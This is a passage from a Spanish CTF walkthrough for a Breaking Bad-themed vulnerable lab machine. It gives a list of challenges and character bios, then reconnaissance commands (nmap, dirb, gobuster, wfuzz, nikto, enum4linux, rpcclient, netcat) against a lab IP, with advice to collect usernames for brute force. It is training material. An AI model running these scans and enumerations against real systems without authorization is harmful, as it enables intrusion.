<strong>Requisitos previos:</strong> Conexión desde Kali Linux u otro
entorno ofensivo</p>
<p><span id="_Toc207189786" class="anchor"></span><strong>🔐 Descripción
General</strong></p>
<p>Este documento organiza los 25 retos (10 moscas y 15 banderas) en un
orden recomendado para el jugador. El objetivo es guiarle por una
progresión lógica de dificultad, narrativa y aprendizaje técnico. El CTF
está inspirado en el universo de <em>Breaking Bad</em>, con personajes,
contraseñas y pruebas interconectadas.</p>
<p><span id="_Toc207189787" class="anchor"></span><strong>🐞 Parte 1:
Las Moscas (Criptografía - Steganografía - Forense - WEB - OSINT - Red -
Misc)</strong></p>
<table>
<colgroup>
<col style="width: 6%" />
<col style="width: 14%" />
<col style="width: 38%" />
<col style="width: 40%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>🧩 Nº</strong></th>
<th style="text-align: center;"><strong>Nombre de Mosca</strong></th>
<th style="text-align: center;"><strong>Tipo</strong></th>
<th
style="text-align: center;"><strong>Explotación/Vulnerabilidad</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Mosca 1</td>
<td>Criptog. + Steganografía</td>
<td>Hex + Espectograma</td>
</tr>
<tr>
<td>2</td>
<td>Mosca 2</td>
<td>Criptografía + Forense</td>
<td>Brainfuck + Exiftool</td>
</tr>
<tr>
<td>3</td>
<td>Mosca 3</td>
<td>Criptografía + Misc</td>
<td>QR + Editor Hex</td>
</tr>
<tr>
<td>4</td>
<td>Mosca 4</td>
<td>Criptografía + WEB</td>
<td>Pigpen + SQL Injection</td>
</tr>
<tr>
<td>5</td>
<td>Mosca 5</td>
<td>Forense</td>
<td>Crackeo RAR</td>
</tr>
<tr>
<td>6</td>
<td>Mosca 6</td>
<td>Criptografía + Misc</td>
<td>Imagen térmica + Braille</td>
</tr>
<tr>
<td>7</td>
<td>Mosca 7</td>
<td>Criptografía + Misc</td>
<td>Octal + Hash</td>
</tr>
<tr>
<td>8</td>
<td>Mosca 8</td>
<td>Criptografía + OSINT</td>
<td>Base64 + Investigación</td>
</tr>
<tr>
<td>9</td>
<td>Mosca 9</td>
<td>Criptog. + Steganografía</td>
<td>ROT9 + DTMF Audio</td>
</tr>
<tr>
<td>10</td>
<td>Mosca 10</td>
<td>Criptografía + Red</td>
<td>Atbash + pcap HTTP</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189788" class="anchor"></span><strong>⚙️ Parte 2:
Las Banderas (Sistemas, Red, Forense)</strong></p>
<table>
<colgroup>
<col style="width: 4%" />
<col style="width: 18%" />
<col style="width: 37%" />
<col style="width: 40%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Nº</strong></th>
<th style="text-align: center;"><strong>Bandera</strong></th>
<th style="text-align: center;"><strong>Categoría</strong></th>
<th
style="text-align: center;"><strong>Explotación/Vulnerabilidad</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>11</td>
<td>Bandera 1</td>
<td>Privilegios</td>
<td>sudoers</td>
</tr>
<tr>
<td>12</td>
<td>Bandera 2</td>
<td>Red</td>
<td>FTP anónimo</td>
</tr>
<tr>
<td>13</td>
<td>Bandera 3</td>
<td>Privilegios</td>
<td>SUID</td>
</tr>
<tr>
<td>14</td>
<td>Bandera 4</td>
<td>Forense</td>
<td>archivos sin ext.</td>
</tr>
<tr>
<td>15</td>
<td>Bandera 5</td>
<td>Red / Forense</td>
<td>Análisis en Wireshark</td>
</tr>
<tr>
<td>16</td>
<td>Bandera 6</td>
<td>Red / Exploit</td>
<td>Samba CVE-2017</td>
</tr>
<tr>
<td>17</td>
<td>Bandera 7</td>
<td>Red / Brute-force</td>
<td>SSH débil</td>
</tr>
<tr>
<td>18</td>
<td>Bandera 8</td>
<td>Red / Forense</td>
<td>Certificado oculto</td>
</tr>
<tr>
<td>19</td>
<td>Bandera 9</td>
<td>Red / Recon</td>
<td>Netcat</td>
</tr>
<tr>
<td>20</td>
<td>Bandera 10</td>
<td>Web Exploitation</td>
<td>LFI PHP</td>
</tr>
<tr>
<td>21</td>
<td>Bandera 11</td>
<td>Criptografía / Puzzle</td>
<td>Guion PDF</td>
</tr>
<tr>
<td>22</td>
<td>Bandera 12</td>
<td>Warm-up</td>
<td>Permisos</td>
</tr>
<tr>
<td>23</td>
<td>Bandera 13</td>
<td>Forense / Logs</td>
<td>logs ocultos</td>
</tr>
<tr>
<td>24</td>
<td>Bandera 14</td>
<td>Forense / Memoria</td>
<td>Volcado memoria</td>
</tr>
<tr>
<td>25</td>
<td>Bandera 15</td>
<td>Pwn / Exploit binario</td>
<td>Buffer Overflow</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189789" class="anchor"></span><strong>🧠
Recomendaciones para los Jugadores</strong></p>
<ul>
<li><p><strong>Utiliza Kali Linux</strong>: Las herramientas necesarias
están preinstaladas.</p></li>
<li><p><strong>Comienza desde la Web</strong>: Inspecciona fuente,
analiza imágenes, descifra.</p></li>
<li><p><strong>Escanea puertos regularmente</strong>: Muchos retos están
ocultos.</p></li>
<li><p><strong>No subestimes los logs ni archivos sin
extensión</strong>.</p></li>
<li><p><strong>Trabaja con binarios en entornos 32-bit si es
posible</strong>.</p></li>
<li><p><strong>Lee la narrativa</strong>: Muchas pistas están conectadas
con los personajes.</p></li>
</ul>
<p><span id="_Toc207189790" class="anchor"></span><strong>📎
Observaciones del Autor</strong></p>
<ul>
<li><p>Los retos permiten resolución libre, pero este orden favorece el
flujo y aprendizaje.</p></li>
<li><p>Hay desafíos diseñados con un toque cinematográfico y técnico que
simulan la dualidad Walter/Gus.<strong><br />
</strong></p></li>
</ul>
<h1
id="introducción-al-walkthrough-máquina-ctf-los-pollos-hermanos-breaking-server"><strong>🧬
Introducción al Walkthrough: Máquina CTF “Los Pollos Hermanos Breaking
Server”</strong></h1>
<p>La máquina está diseñada como una experiencia CTF integral que simula
diferentes escenarios del universo <em>Breaking Bad</em>—cargada de
desafíos técnicos, criptográficos, forenses y de explotación activa.
Cada reto está cuidadosamente ambientado y enlazado con elementos
narrativos que potencian el realismo y el aprendizaje técnico.</p>
<p><span id="_Toc207189792" class="anchor"></span><strong>🗂️ Categorías
de retos incluidas</strong></p>
<table>
<colgroup>
<col style="width: 26%" />
<col style="width: 44%" />
<col style="width: 29%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Categoría</strong></th>
<th style="text-align: center;"><strong>Subtipos y técnicas
usadas</strong></th>
<th style="text-align: center;"><strong>Retos asociados</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>🔐 Criptografía</td>
<td>Hashing, frase oculta en documento, steganografía</td>
<td>Mosca 1–10, Bandera 7, 8, 11</td>
</tr>
<tr>
<td>🧬 Esteganografía</td>
<td>Espectograma, audio DTMF, imagen térmica, PDF oculto</td>
<td>Mosca 1, 6, 9, Bandera 4, 14</td>
</tr>
<tr>
<td>🔎 Forense</td>
<td>Logs falsificados, ctime manipulado, análisis de RAM</td>
<td>Mosca 2, 5, Bandera 4, 12, 13, 14</td>
</tr>
<tr>
<td>📦 Red</td>
<td>FTP anónimo, análisis de .pcap (DNS, TLS, HTTP)</td>
<td>Bandera 2, 5, 8, 10</td>
</tr>
<tr>
<td>🛡️ Pwn</td>
<td>Exploits en Samba, SSH, Buffer Overflow</td>
<td>Bandera 3, 6, 7, 15</td>
</tr>
<tr>
<td>🕵️ Web Exploitation</td>
<td>Inyección SQL, LFI, formularios inseguros</td>
<td>Mosca 4, Bandera 10</td>
</tr>
<tr>
<td>🧠 Reconocimiento</td>
<td>Escaneo de puertos, enumeración</td>
<td>Bandera 9</td>
</tr>
<tr>
<td>📜 Misc / OSINT</td>
<td>QR, búsqueda de desaparecida, análisis de exif</td>
<td>Mosca 3, 8</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189793" class="anchor"></span><strong>⚙️ Modalidades
de interacción</strong></p>
<ul>
<li><p><strong>Estáticas:</strong> Desafíos de análisis y
decodificación.</p></li>
<li><p><strong>Dinámicas:</strong> Retos con interacción en tiempo real
(servicios corriendo).</p></li>
<li><p><strong>Narrativas:</strong> Retos escondidos en artefactos tipo
serie (PDFs, diálogos, nombres de personajes).</p></li>
</ul>
<p><span id="_Toc207189794" class="anchor"></span><strong>💥 Objetivo
formativo</strong></p>
<p>Este CTF está orientado tanto a jugadores novatos como intermedios,
incluyendo retos:</p>
<ul>
<li><p><strong>Reconocibles por firmas clásicas</strong> (LFI, SUID,
sudoers).</p></li>
<li><p><strong>Adaptables a técnicas avanzadas</strong> (CVE, binarios,
espectro de audio).</p></li>
<li><p><strong>Con lecciones de buenas prácticas de seguridad</strong>,
como el uso de permisos, validación de inputs, y análisis de
logs.</p></li>
</ul>
<p>🎬 Cada reto representa una pieza del rompecabezas narrativo con
guiños al universo de <em>Breaking Bad</em>. Desde claves ocultas en el
espectro de audio hasta banderas que sólo aparecen si “el tiempo se
corrige”, esta máquina exige observación, curiosidad y análisis
técnico.</p>
<p><strong><br />
</strong></p>
<h1 id="personajes"><strong>🐔 Personajes</strong></h1>
<p><strong>Personajes simulados en esta máquina:</strong></p>
<p><strong>Mike Ehrmantraut</strong></p>
<ul>
<li><p>Rol: Jefe de seguridad, investigador y sicario.</p></li>
<li><p>Función: Protege los intereses de Gus, investiga amenazas,
realiza trabajos sucios y coordina la logística y la
vigilancia.</p></li>
</ul>
<p><strong>Victor</strong></p>
<ul>
<li><p>Rol: Asistente y ejecutor.</p></li>
<li><p>Función: Hombre de confianza de Gus. Ayuda a supervisar las
operaciones, vigila a Walter y Jesse, y realiza tareas de
campo.</p></li>
</ul>
<p><strong>Tyrus Kitt</strong></p>
<ul>
<li><p>Rol: Guardaespaldas y ejecutor.</p></li>
<li><p>Función: Reemplaza a Victor como principal asistente de campo
tras su muerte. Fiel y reservado.</p></li>
</ul>
<p><strong>Lydia Rodarte-Quayle</strong></p>
<ul>
<li><p>Rol: Proveedora de químicos.</p></li>
<li><p>Función: Contacto corporativo que ayuda a suministrar metilamina
para la producción de metanfetamina. Aunque aparece más en Better Call
Saul y temporadas finales.</p></li>
</ul>
<p><strong>Héctor Salamanca</strong></p>
<ul>
<li><p>Rol: Miembro del cártel de Juárez.</p></li>
<li><p>Función: Antiguo rival de Gus, pero tuvo conexiones con él y su
red en el pasado. Importante por su historia compartida.</p></li>
</ul>
<p><strong>Duane Chow</strong></p>
<ul>
<li><p>Profesión: Dueño de una empresa de suministros químicos
industriales: Chow's Industrial Supply.</p></li>
<li><p>Relación con Gus Fring: Chow era uno de los distribuidores y
colaboradores delictivos de Gus, ayudando a suministrar materiales
necesarios para la producción de metanfetamina (como precursores
químicos).</p></li>
</ul>
<p><strong>Saul Goodman</strong></p>
<ul>
<li><p>Rol: Abogado criminalista "del crimen" y asesor legal de Walter
White y Jesse Pinkman.</p></li>
<li><p>Función: Ayuda a Walter y Jesse a sortear problemas legales y a
ocultar sus actividades delictivas. Introduce a Walter con personajes
más peligrosos como Mike Ehrmantraut (su "solucionador") y Gus Fring (su
red de distribución de drogas). Diseña estrategias para legalizar las
ganancias ilícitas de Walter, como la compra del lavado de
autos.</p></li>
</ul>
<p><strong>Gustavo Fring</strong></p>
<ul>
<li><p>Rol: Empresario aparentemente respetable que, en secreto, es un
importante narcotraficante.</p></li>
<li><p>Función: Controla una red de distribución de drogas en el
suroeste de EE. UU. Recluta a Walter White como cocinero por la pureza
de su metanfetamina. Representa una versión calculadora, fría y
profesional del crimen. Su existencia fuerza a Walter a volverse más
despiadado para sobrevivir.</p></li>
</ul>
<p><strong>Jesse_Pinkman</strong></p>
<ul>
<li><p>Rol: socio y aprendiz de Walter White en la producción de
metanfetamina. Representa el conflicto moral, la lealtad emocional y la
parte humana del negocio criminal.</p></li>
<li><p>Función: Es el primer enlace de Walter con el mundo del
narcotráfico. Walter lo busca inicialmente porque Jesse ya tiene
experiencia como "cocinero" y distribuidor. Mientras Walter se
deshumaniza, Jesse se culpabiliza, sufre y se cuestiona las
consecuencias del negocio.</p></li>
</ul>
<p><strong>Gale Boetticher</strong></p>
<ul>
<li><p>Rol: Químico brillante y meticuloso.</p></li>
<li><p>Función: ser la mano derecha de Gus Fring en la producción de
metanfetamina. Gus lo contrató para diseñar y operar el superlaboratorio
subterráneo, con el objetivo de perfeccionar el proceso de cocinado y,
finalmente, reemplazar a Walter White. Gale representaba la alternativa
"segura" y profesional: un científico que podía producir metanfetamina
de la más alta pureza sin el ego ni el caos que acompañaban a Walter
White.</p></li>
</ul>
<p><strong>Walter White</strong></p>
<ul>
<li><p>Walter White es el personaje principal de la serie "Breaking
Bad". Su rol y función en la historia evolucionan drásticamente a lo
largo de las temporadas. Al principio, es un profesor de química de
instituto, con una vida anodina y un trabajo que apenas le da para
mantener a su familia. Su rol inicial es el de un hombre de familia
común y corriente, que se ve enfrentado a una situación límite: le
diagnostican un cáncer de pulmón inoperable.</p></li>
<li><p>A partir de este diagnóstico, su función en la serie cambia por
completo. Deja de ser un simple profesor para convertirse en un
criminal. Con el tiempo, su rol se transforma aún más. Pasa de ser un
hombre asustado y forzado por las circunstancias a ser un
narcotraficante ambicioso y despiadado, conocido como
"Heisenberg".</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="fase-0-reconocimiento-y-recopilación-inicial"><strong>🧭 Fase 0
– Reconocimiento y Recopilación Inicial</strong></h1>
<p><span id="_Toc207189797" class="anchor"></span><strong>🎯
Objetivo:</strong></p>
<p>Identificar y mapear servicios disponibles, arquitectura de la
máquina, archivos visibles, tecnologías web, posibles pistas y
vulnerabilidades.</p>
<p>El comando inicial más habitual sería un <strong>escaneo de
descubrimiento de hosts</strong> en tu rango de red:</p>
<p>nmap -sn 192.168.1.0/24</p>
<p><img src="cookbook/media/image2.png"
style="width:5.90556in;height:4.61319in" /></p>
<p><img src="cookbook/media/image3.png"
style="width:5.90556in;height:4.23056in" /></p>
<p>🔍 <strong>Explicación rápida</strong>:</p>
<ul>
<li><p>-sn → Solo hace "ping scan" (host discovery), sin escanear
puertos.</p></li>
<li><p>192.168.1.0/24 → Cambia este rango por el que corresponda a tu
red virtual.</p>
<ul>
<li><p>Para saberlo, en Kali ejecuta:</p></li>
<li><p>ip a</p></li>
</ul></li>
</ul>
<p>y revisa la IP de tu interfaz de red (por ejemplo, 192.168.56.x si
usas Host-Only, o 10.0.2.x si usas NAT).</p>
<p>💡 Tip: En VirtualBox, si usas <strong>Adaptador puente</strong>, es
probable que tu red sea la misma que la de tu router doméstico, así que
el rango podría ser 192.168.1.0/24.<br />
Si usas <strong>Host-Only</strong>, el rango habitual es
192.168.56.0/24.</p>
<p>Ahora que ya conoces la IP de la máquina víctima, puedes hacer un
escaneo de puertos y servicios con <strong>nmap</strong>.</p>
<p>Para un análisis inicial rápido:</p>
<p>nmap -sS -sV -O 192.168.1.44</p>
<p>🔍 <strong>Qué hace cada parámetro</strong>:</p>
<ul>
<li><p>-sS → Escaneo SYN (rápido y sigiloso).</p></li>
<li><p>-sV → Detecta versiones de servicios.</p></li>
<li><p>-O → Intenta identificar el sistema operativo.</p></li>
</ul>
<p><img src="cookbook/media/image4.png"
style="width:5.90556in;height:4.68056in" /></p>
<p>Aquí ya podemos ver algo que pone bandera
‘Estoy_en_el_negocio_del_imperio’</p>
<p>Si quieres <strong>no dejarte ningún puerto</strong>, usa un escaneo
más completo:</p>
<p>nmap -p- -sS 192.168.1.44</p>
<p><em>(Escanea todos los puertos TCP, 1 al 65535, pero sin detección de
versiones todavía)</em></p>
<p><img src="cookbook/media/image5.png"
style="width:5.90556in;height:2.26736in" /></p>
<p>Luego, con los puertos detectados, profundizas:</p>
<p>nmap -p PUERTOS_ENCONTRADOS -sV -sC 192.168.1.44</p>
<p>Esos puertos ya nos dicen bastante sobre el terreno que vamos a pisar
😏.<br />
Podemos organizar la <strong>profundización</strong> por puerto,
priorizando los que suelen dar más juego en un CTF.</p>
<p><span id="_Toc207189798" class="anchor"></span><strong>🔍 Paso 1 –
Escaneo detallado con Nmap sobre los puertos encontrados</strong></p>
<p>nmap -p 21,22,80,139,445,31337 -sV -sC 192.168.1.44</p>
<p>Esto nos dará:</p>
<ul>
<li><p>Versiones exactas de servicios.</p></li>
<li><p>Scripts NSE básicos (banner grabbing, enumeración inicial SMB,
etc.).</p></li>
</ul>
<p><img src="cookbook/media/image6.png"
style="width:5.90556in;height:4.76319in" /></p>
<p><img src="cookbook/media/image7.png"
style="width:5.90556in;height:4.90486in" /></p>
<p><span id="_Toc207189799" class="anchor"></span><strong>📂 Paso 2 –
Enumeración por servicio</strong></p>
<p><strong>Puerto 21 (FTP)</strong></p>
<p>Ver si permite <strong>acceso anónimo</strong>:</p>
<p>ftp 192.168.1.44</p>
<p>Usuario: anonymous, sin contraseña o con email.</p>
<p>Si hay acceso, listar y descargar archivos.</p>
<p>Si está cerrado pero detectas versión vulnerable (por ej. vsftpd
2.3.4), buscar exploits en:</p>
<p>searchsploit vsftpd</p>
<p><img src="cookbook/media/image8.png"
style="width:5.90556in;height:1.63611in" /></p>
<p><strong>Puerto 22 (SSH)</strong></p>
<p>Suele ser puerta final para ganar acceso, no tanto inicial.</p>
<p>Apuntar versión de SSH para ver si hay vulnerabilidades
conocidas.</p>
<p>No hacer fuerza bruta todavía (ruido innecesario), salvo que tengas
un usuario válido.</p>
<p><img src="cookbook/media/image9.png"
style="width:5.90556in;height:2.24236in" /></p>
<p><strong>Puerto 80 (HTTP)</strong></p>
<p>Abrir en navegador: http://192.168.1.44</p>
<p>Enumerar con:</p>
<p>dirb http://192.168.1.44 /usr/share/wordlists/dirb/common.txt</p>
<p><img src="cookbook/media/image10.png"
style="width:5.90556in;height:2.77986in" /></p>
<p><img src="cookbook/media/image11.png"
style="width:5.90556in;height:4.15347in" /></p>
<p>Si quieres más profundidad:</p>
<p>dirb http://192.168.1.44 /usr/share/wordlists/dirb/big.txt</p>
<p><img src="cookbook/media/image12.png"
style="width:5.90556in;height:3.98681in" /></p>
<p><strong>WFuzz</strong> (más flexible)</p>
<p>wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 <a
href="http://192.168.1.44/FUZZ"><u>http://192.168.1.44/FUZZ</u></a></p>
<p>--hc 404 → Oculta las respuestas con código 404.</p>
<p>nikto -h 192.168.1.44</p>
<p>Revisar código fuente, robots.txt, etc.</p>
<p><img src="cookbook/media/image13.png"
style="width:5.90556in;height:2.65972in" /></p>
<p><strong>Puertos 139 y 445 (SMB)</strong></p>
<p>Enumerar recursos compartidos:</p>
<p>smbclient -L //192.168.1.44</p>
<p>Usuario vacío o guest sin contraseña.</p>
<p>Usar enum4linux:</p>
<p>enum4linux -a 192.168.1.44</p>
<p>Si hay shares accesibles, entrar y listar contenido.</p>
<p><img src="cookbook/media/image14.png"
style="width:5.90556in;height:0.36736in" /></p>
<p><strong>Puerto 31337</strong></p>
<p>Número inusual → posible servicio personalizado o backdoor.</p>
<p>Conectarte y ver respuesta:</p>
<p>nc 192.168.1.44 31337</p>
<p>Si habla algún protocolo (telnet, HTTP, chat, etc.), interactuar y
analizar.</p>
<p><img src="cookbook/media/image15.png"
style="width:5.90556in;height:0.49861in" /></p>
<p>💡 Lo ideal:<br />
Primero agotar información con <strong>FTP, HTTP y SMB</strong>, porque
suelen dar credenciales o ficheros que después permiten entrar por SSH o
explotar el servicio raro en el 31337.</p>
<p>📌 -sC → Ejecuta scripts NSE básicos de enumeración, muy útil en
CTF.</p>
<p>Si tienes los puertos <strong>139 y 445</strong> abiertos, enum4linux
es una gran opción para enumerar usuarios y shares SMB.</p>
<p><strong>Comando recomendado para enumeración completa:</strong></p>
<p>enum4linux -a 192.168.1.44</p>
<p>-a → Lanza todas las pruebas (usuarios, shares, políticas, SID,
etc.).</p>
<p>Te listará posibles <strong>nombres de usuario</strong> y
<strong>recursos compartidos</strong>.</p>
<p>Si el servidor SMB permite null sessions, obtendrás bastante
información.</p>
<p><img src="cookbook/media/image16.png"
style="width:5.90556in;height:1.65in" /></p>
<p><img src="cookbook/media/image17.png"
style="width:5.90556in;height:2.62153in" /></p>
<p><img src="cookbook/media/image18.png"
style="width:5.90556in;height:4.68681in" /></p>
<p><img src="cookbook/media/image19.png"
style="width:4.52083in;height:1.16667in" /></p>
<p><img src="cookbook/media/image20.png"
style="width:5.90556in;height:4.69722in" /></p>
<p><strong>Si quieres solo enumerar usuarios:</strong></p>
<p>enum4linux -U 192.168.1.44</p>
<p>Más rápido y centrado en usuarios.</p>
<p><img src="cookbook/media/image21.png"
style="width:5.90556in;height:2.18958in" /></p>
<p><strong>También puedes usar rpcclient para confirmar:</strong></p>
<p>rpcclient -U "" 192.168.1.44</p>
<p><em>(Deja la contraseña vacía cuando te lo pida)</em><br />
Luego, en la consola interactiva:</p>
<p>enumdomusers</p>
<p>📌 Consejo CTF: Guarda bien los nombres de usuario que aparezcan,
porque luego pueden servir para <strong>fuerza bruta en SMB, SSH o el
servicio raro en el puerto 31337</strong>.</p>
<p>Para encontrar todos los directorios y páginas web, incluyendo con
extensiones variadas como .php, .html, .js, etc., puedes usar
herramientas de fuerza bruta de directorios con wordlists amplias y que
prueben muchas extensiones. Aquí tienes las opciones más usadas y
efectivas:</p>
<p><strong>1️⃣ Dirb (simple y rápido)</strong></p>
<p>dirb http://192.168.1.44 /usr/share/wordlists/dirb/common.txt -X
.php,.html,.js,.txt,.bak</p>
<p><img src="cookbook/media/image22.png"
style="width:5.90556in;height:3.40903in" /></p>
<p>-X permite especificar extensiones a probar.</p>
<p>Prueba con extensiones comunes además de las típicas.</p>
<p><strong>2️⃣ Gobuster (más flexible)</strong></p>
<p>gobuster dir -u http://192.168.1.44 -w
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x
php,html,js,txt,bak</p>
<p>-x para extensiones.</p>
<p>Usa un wordlist más grande para mayor cobertura.</p>
<p><strong>3️⃣ WFuzz (muy configurable)</strong></p>
<p>wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 -u
http://192.168.1.44/FUZZ.php</p>
<p>Cambia la extensión en el URL para probar varias.</p>
<p>Para probar muchas extensiones puedes hacer varios comandos o
scripts.</p>
<p><strong>4️⃣ Burp Suite (interactivo)</strong></p>
<p>Si prefieres interfaz gráfica y más control, Burp Suite tiene una
función de <em>Intruder</em> para fuzzing de rutas con múltiples
extensiones y payloads.</p>
<p><span id="_Toc207189800"
class="anchor"></span><strong>Consejos:</strong></p>
<ul>
<li><p>Combina varias extensiones en tus pruebas para no perder
nada.</p></li>
<li><p>Usa wordlists grandes y específicas para directorios y archivos
web.</p></li>
<li><p>Si quieres buscar también ficheros sin extensión o con nombres
raros, usa wordlists más amplias o crea la tuya propia.</p></li>
<li><p>No te olvides de revisar también la página principal (/) y sus
scripts para posibles pistas.</p></li>
</ul>
<p><strong>📁 Análisis de las URLs</strong></p>
<p>Una vez entramos al index podemos ver que el resto de directorios es
accesible en formato de página web del restaurante Los Pollos
Hermanos.</p>
<p><strong>URLs:</strong></p>
<p><a
href="http://192.168.1.44/server-status">http://192.168.1.44/server-status</a></p>
<p>El status del server no devuelve nada raro o interesante:</p>
<p><img src="cookbook/media/image23.png"
style="width:5.90556in;height:1.91944in" /></p>
<p><a
href="http://192.168.1.44/archivos/">http://192.168.1.44/archivos/</a></p>
<p>Esta url contiene lo que parecen ser los archivos multimedia de la
web y algún archivo más:</p>
<p><img src="cookbook/media/image24.png"
style="width:2.92795in;height:3.03503in" /></p>
<p>Listado de archivos:</p>
<table style="width:100%;">
<colgroup>
<col style="width: 8%" />
<col style="width: 37%" />
<col style="width: 38%" />
<col style="width: 12%" />
<col style="width: 2%" />
</colgroup>
<thead>
<tr>
<th><img src="cookbook/media/image25.gif"
style="width:0.20833in;height:0.22917in" alt="[SND]" /></th>
<th><a
href="http://192.168.1.44/archivos/Bienvenidos.mp3"><u>Bienvenidos.mp3</u></a></th>
<th style="text-align: right;">2025-07-17 16:13</th>
<th style="text-align: right;">101K</th>
<th> </th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="cookbook/media/image26.gif"
style="width:0.20833in;height:0.22917in" alt="[ ]" /></td>
<td><a
href="http://192.168.1.44/archivos/PAN.rar"><u>PAN.rar</u></a></td>
<td style="text-align: right;">2025-07-21 11:12</td>
<td style="text-align: right;">200</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/PIN.png"><u>PIN.png</u></a></td>
<td style="text-align: right;">2025-07-20 18:46</td>
<td style="text-align: right;">2.9M</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image26.gif"
style="width:0.20833in;height:0.22917in" alt="[ ]" /></td>
<td><a
href="http://192.168.1.44/archivos/algo.rar"><u>algo.rar</u></a></td>
<td style="text-align: right;">2025-07-21 11:40</td>
<td style="text-align: right;">270</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/cupon1.png"><u>cupon1.png</u></a></td>
<td style="text-align: right;">2025-07-16 16:50</td>
<td style="text-align: right;">363K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/cupon2.png"><u>cupon2.png</u></a></td>
<td style="text-align: right;">2025-07-16 16:49</td>
<td style="text-align: right;">441K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/cupon3.png"><u>cupon3.png</u></a></td>
<td style="text-align: right;">2025-07-16 16:52</td>
<td style="text-align: right;">357K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/desaparecida.jpg"><u>desaparecida.jpg</u></a></td>
<td style="text-align: right;">2025-07-20 18:01</td>
<td style="text-align: right;">19K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/horario.jpg"><u>horario.jpg</u></a></td>
<td style="text-align: right;">2025-07-18 10:36</td>
<td style="text-align: right;">216K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image26.gif"
style="width:0.20833in;height:0.22917in" alt="[ ]" /></td>
<td><a
href="http://192.168.1.44/archivos/http_jpeg.pcapng"><u>http_jpeg.pcapng</u></a></td>
<td style="text-align: right;">2025-07-19 10:00</td>
<td style="text-align: right;">504K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image25.gif"
style="width:0.20833in;height:0.22917in" alt="[SND]" /></td>
<td><a
href="http://192.168.1.44/archivos/llamada.wav"><u>llamada.wav</u></a></td>
<td style="text-align: right;">2025-07-20 08:49</td>
<td style="text-align: right;">405K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/logo.png"><u>logo.png</u></a></td>
<td style="text-align: right;">2025-07-15 11:27</td>
<td style="text-align: right;">77K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu1.jpg"><u>menu1.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 09:38</td>
<td style="text-align: right;">167K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu2.jpg"><u>menu2.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 09:30</td>
<td style="text-align: right;">259K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu3.jpg"><u>menu3.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 09:28</td>
<td style="text-align: right;">493K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu4.jpg"><u>menu4.jpg</u></a></td>
<td style="text-align: right;">2025-07-15 11:26</td>
<td style="text-align: right;">13K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu5.jpg"><u>menu5.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 12:19</td>
<td style="text-align: right;">206K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu6.jpg"><u>menu6.jpg</u></a></td>
<td style="text-align: right;">2025-07-16 12:20</td>
<td style="text-align: right;">101K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu7.jpg"><u>menu7.jpg</u></a></td>
<td style="text-align: right;">2025-07-15 11:25</td>
<td style="text-align: right;">15K</td>
<td> </td>
</tr>
<tr>
<td><img src="cookbook/media/image27.gif"
style="width:0.20833in;height:0.22917in" alt="[IMG]" /></td>
<td><a
href="http://192.168.1.44/archivos/menu8.jpg"><u>menu8.jpg</u></a></td>
